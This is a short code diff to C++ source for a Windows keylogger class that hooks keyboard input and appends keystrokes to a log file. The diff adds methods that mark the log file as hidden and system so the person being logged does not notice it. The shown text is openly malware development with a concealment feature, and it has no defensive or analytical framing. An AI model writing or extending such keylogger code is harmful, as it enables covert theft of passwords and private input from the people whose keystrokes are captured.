@@ -10,6 +10,17 @@ KeyLogger::KeyLogger(const std::string& filename) {
     filePath = filename;
 }
 
+
+
+void KeyLogger::hideFile(const std::string& filename) {
+        SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
+
+void KeyLogger::unhideFile(const std::string& filename) {
+    SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_NORMAL);
+}
+
+
 void KeyLogger::start() {
     outFile.open(filePath, std::ios::app);
     if (!outFile.is_open()) return;
@@ -127,3 +138,5 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
 
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
+
+
